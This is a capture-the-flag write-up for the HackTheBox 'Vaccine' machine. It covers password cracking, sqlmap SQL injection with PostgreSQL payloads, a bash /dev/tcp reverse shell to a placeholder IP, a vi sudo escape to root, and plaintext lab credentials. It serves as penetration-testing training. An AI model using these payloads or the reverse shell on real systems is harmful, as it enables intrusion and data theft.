# Vaccine -- HackTheBox

## Let's jump into it

As always, the first stage is to find informations with  
`nmap -sC -sV 10.10.10.46`

And we see 3 Open Ports: 21/22/80, respectively ftp/ssh/http
In the Last box we remember this: `ftpuser / mc@F1l3ZilL4` so let's use it  
Once logged there is a backup.zip file let's just get it  
But trying to unzip it, it reveals to be passw protected !!

## Zip Zip Open !

To break this Zip file let's juste use [JohnTheRipper](https://github.com/openwall/john)  
Let's first break our zip with `zip2john backup.zip > hash` and then let's give it to john with the well known rockyou.txt dictionnary:

```bash
john hash --fork=4 -w=/home/romain/tools/dict/rockyou.txt
```

And we get in retrun the following passw: "741852963" !!  
Let's open our archive then! 
We don't really care about the css but the php !!!!! Really cool and we have a MD5 password !!

## Break the MD5 password!

I honestly don't know a lot of rainbow table tools but there is one, ALWAYS RELAYABLE
the only one and unique [CrackStation](https://crackstation.net/) !!  
Let's use it once again by pasting our MD5 to the webpage and we have a password: "qwerty789"!!  
As it is in php, there is something interesting in our port 80!!  

## Let's break the Internet  

Just tap 10.10.10.46 in firefox and we're on a web form !  
Let's use our password, and as they don't seems that inspired let's use "admin" as our login !
And Bingo we're on a webpage.  
After 5min on the site we notice that every search request goes as a GET parameter.
And we see in the storage that we're using Cookies to keep our session Id
The get parameter seems to interact directly with the database and we have a session Id to fake our existence on the web.  
Let's try a good old sql injection!!  With SQLMap !!  

## SQL mappy! 

Let's type our sqlmap call with our addresse, a random parameter and our PHPSESSID:
`python3 ~/tools/sqlmap/sqlmap.py -u 'http://10.10.10.46/dashboard.php?search=AAAA' --cookie="PHPSESSID=vja57thnu5f0huspo3nms2na9s"`
And there it goes --> Effectively our search parameter is weak and SQLMap break in!  

```bash
sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=AAAA' AND (SELECT (CASE WHEN (2161=2161) THEN NULL ELSE CAST((CHR(84)||CHR(111)||CHR(115)||CHR(113)) AS NUMERIC) END)) IS NULL-- MGJc

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=AAAA' AND 9214=CAST((CHR(113)||CHR(112)||CHR(112)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9214=9214) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(122)||CHR(113)) AS NUMERIC)-- gIac

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=AAAA';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=AAAA' AND 3159=(SELECT 3159 FROM PG_SLEEP(5))-- gqNs
---
[21:41:56] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[21:41:57] [INFO] fetched data logged to text files under '/home/romain/.local/share/sqlmap/output/10.10.10.46'

[*] ending @ 21:41:57 /2020-09-19/
```

And so we goes just the same command but add --os-shell to the end so we can use some basic commands!
But the postgreSql is not that friendly so let's put a reverse shell in our database and access it later!  

## The Ultime Reverse Card

We can send a reverse shell from a bash command and here it is:
`bash -c 'bash -i >& /dev/tcp/MON_IP/4444 0>&1'`  
(choose every port you want we don't really care about that)
**REMINDER:** As we're working on a private and independant network, your personal ip is on the the website as "HTB Network IPv4" !!
Now that my reverse shell is active let's just do a `whoami` to discover that we're postgres !!  Great news !

## Get some privilege and chill  

So let's first use a regular bash, so do type this: `SHELL=/bin/bash script -q /dev/null`  
And then, let's go to the folder where the webpages are stocked to get stg great (/var/www/html)
And we haven't seen dashboard.js/php yet so let's have a look!!  

And here is a treasure !!

```php
try {
    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
}
```

After doing a `sudo -l` we gained a lot of access and the autorisation to edit pg_hba.conf
Let's use vi and the `:` shortcut to execute a command.
Let's just do `:!/bin/bash` and now we notice that we're root !
And in our home there is a root.txt containing: `**CENSORED**` !!  

And we're done with this box!!  